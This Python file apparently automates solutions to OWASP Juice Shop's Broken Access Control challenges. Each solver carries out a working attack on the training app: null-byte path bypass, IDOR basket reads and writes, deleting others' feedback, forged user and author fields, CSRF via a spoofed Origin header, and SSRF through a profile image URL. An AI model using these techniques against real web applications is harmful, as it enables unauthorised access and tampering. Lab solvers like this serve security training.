"""Broken Access Control category solvers (11 of 12 — aiDebuggingChallenge
needs a real LLM tool-call via routes/chat.ts and is deferred, same as the 3
chatbot challenges excluded in Phase 1). Verified against routes/verify.ts,
routes/basket.ts, routes/basketItems.ts, routes/createProductReviews.ts,
routes/updateUserProfile.ts, routes/profileImageUrlUpload.ts, server.ts, and
config/default.yml (fetched 2026-08-09)."""
import uuid

from core.client import JuiceShopClient
from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/verify.ts accessControlChallenges, mounted on
# /assets/public/images/padding: solved by requesting the numbered tracking
# pixel directly, as long as the request wasn't triggered by real browser
# navigation (`sec-fetch-dest: document` header or a `referer` header — a
# plain HTTP client sends neither by default, so `uiBypassed` is true). ---

@register("web3SandboxChallenge", "Broken Access Control", 1)
def solve_web3_sandbox(ctx: SolverContext) -> None:
    ctx.client.get("/assets/public/images/padding/11px.png").raise_for_status()


@register("adminSectionChallenge", "Broken Access Control", 2)
def solve_admin_section(ctx: SolverContext) -> None:
    ctx.client.get("/assets/public/images/padding/19px.png").raise_for_status()


# --- routes/fileServer.ts verifySuccessfulPoisonNullByteExploit: same
# poison-null-byte technique as forgottenDevBackupChallenge in Task 1
# (Sensitive Data Exposure) — this one's just categorized as Broken Access
# Control instead because the file being reached (a hidden game easter egg)
# isn't "sensitive data" per se. ---

@register("easterEggLevelOneChallenge", "Broken Access Control", 4)
def solve_easter_egg_level_one(ctx: SolverContext) -> None:
    ctx.client.get("/ftp/eastere.gg%2500.md").raise_for_status()


# --- routes/verify.ts databaseRelatedChallenges (feedbackChallenge()):
# solved when the count of rating=5 Feedback rows is zero. The seeded admin
# account (data/static/users.yml) has one rating-5 feedback. DELETE
# /api/Feedbacks/:id only requires *any* authenticated user
# (security.isAuthorized(), no ownership check) — that's the access-control
# bug. Checked again on the very next request after the deletes. ---

@register("feedbackChallenge", "Broken Access Control", 2)
def solve_feedback(ctx: SolverContext) -> None:
    email = f"delfive.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    resp = ctx.client.get("/api/Feedbacks")
    resp.raise_for_status()
    for feedback in resp.json().get("data", []):
        if feedback.get("rating") == 5:
            ctx.client.session.delete(ctx.client._url(f"/api/Feedbacks/{feedback['id']}")).raise_for_status()
    ctx.client.get("/api/Feedbacks")  # any request re-triggers the global databaseRelatedChallenges check


# --- routes/verify.ts forgedFeedbackChallenge middleware: solved when
# POST /api/Feedbacks carries a `UserId` that doesn't match the actual
# caller (mismatched even when nobody is logged in, since then the caller's
# own id is undefined and any truthy UserId satisfies "!="). Anonymous POST
# is explicitly allowed by server.ts; still needs a fresh captcha like any
# /api/Feedbacks POST. ---

@register("forgedFeedbackChallenge", "Broken Access Control", 3)
def solve_forged_feedback(ctx: SolverContext) -> None:
    captcha = ctx.client.get("/rest/captcha").json()
    ctx.client.post(
        "/api/Feedbacks",
        json={
            "UserId": 1,
            "comment": "forged feedback",
            "rating": 3,
            "captchaId": captcha["captchaId"],
            "captcha": captcha["answer"],
        },
    ).raise_for_status()


# --- routes/createProductReviews.ts: solved the instant a review is
# created whose `author` field differs from the actually-authenticated
# user's email — the endpoint trusts the client-supplied author outright. ---

@register("forgedReviewChallenge", "Broken Access Control", 3)
def solve_forged_review(ctx: SolverContext) -> None:
    email = f"forgerev.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.put(
        f"/rest/products/{product_id}/reviews",
        json={"message": "forged review", "author": f"someone.else@{DOMAIN}"},
    ).raise_for_status()


# --- routes/basketItems.ts addBasketItem: solved as soon as an added
# basket item's BasketId doesn't match the authenticated user's own basket
# id. The endpoint's *first* guard only rejects when BasketId is literally
# missing/"undefined" here we always pass a real (just wrong) id, so the
# check that matters is the solveIf right after, not that guard. ---

@register("basketManipulateChallenge", "Broken Access Control", 3)
def solve_basket_manipulate(ctx: SolverContext) -> None:
    email = f"basketman.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    login_resp = ctx.client.login(email, "Test1234!")
    bid = login_resp.json()["authentication"]["bid"]
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    add_resp = ctx.client.post("/api/BasketItems", json={"ProductId": product_id, "BasketId": bid, "quantity": 1})
    add_resp.raise_for_status()
    item_id = add_resp.json()["data"]["id"]
    ctx.client.put(f"/api/BasketItems/{item_id}", json={"BasketId": bid + 999}).raise_for_status()


# --- routes/basket.ts retrieveBasket: solved by requesting a basket id
# that isn't the authenticated user's own — a plain IDOR, no ownership
# check on the read path. ---

@register("basketAccessChallenge", "Broken Access Control", 2)
def solve_basket_access(ctx: SolverContext) -> None:
    email = f"basketacc.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    login_resp = ctx.client.login(email, "Test1234!")
    bid = login_resp.json()["authentication"]["bid"]
    ctx.client.get(f"/rest/basket/{bid + 999}").raise_for_status()


# --- routes/updateUserProfile.ts: solved by POSTing /profile with an
# `Origin` (or `Referer`) header containing
# config.default.yml's overwriteUrlForCsrfChallenge
# ("http://htmledit.squarefree.com") and a `username` different from the
# current one — simulating a cross-site form post. ---

@register("csrfChallenge", "Broken Access Control", 3)
def solve_csrf(ctx: SolverContext) -> None:
    email = f"csrf.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/profile",
        data={"username": f"csrfed-{uuid.uuid4().hex[:6]}"},
        headers={"Origin": "http://htmledit.squarefree.com"},
    ).raise_for_status()


# --- routes/profileImageUrlUpload.ts + routes/verify.ts serverSideChallenges
# (the same /solve/challenges/server-side endpoint sstiChallenge used in
# Phase 1): setting a profile image URL whose text contains
# "solve/challenges/server-side" flips req.app.locals.abused_ssrf_bug
# (unconditionally, before the server even tries to fetch it), then a
# request to that same endpoint with the fixed key solves ssrfChallenge if
# the flag is set. ---

@register("ssrfChallenge", "Broken Access Control", 6)
def solve_ssrf(ctx: SolverContext) -> None:
    email = f"ssrf.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/profile/image/url", data={"imageUrl": f"{ctx.base_url}/solve/challenges/server-side"})
    ctx.client.get(
        "/solve/challenges/server-side",
        params={"key": "tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"},
    ).raise_for_status()


# --- routes/verify.ts changeProductChallenge (databaseRelatedChallenges):
# solved when the O-Saft product's description no longer contains its
# original urlForProductTamperingChallenge text but does contain an anchor
# tag pointing at config.default.yml's overwriteUrlForProductTamperingChallenge
# ("https://owasp.slack.com"). Overwriting via PUT /api/Products/:id (same
# pattern as restfulXssChallenge in Phase 1). Checked on the next request
# after the update. ---

@register("changeProductChallenge", "Broken Access Control", 3)
def solve_change_product(ctx: SolverContext) -> None:
    email = f"tamper.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    products = ctx.client.get("/rest/products/search", params={"q": "O-Saft"}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.put(
        f"/api/Products/{product_id}",
        json={"description": '<a href="https://owasp.slack.com" target="_blank">More...</a>'},
    ).raise_for_status()
    ctx.client.get("/rest/products/search", params={"q": "O-Saft"})  # re-trigger the periodic check
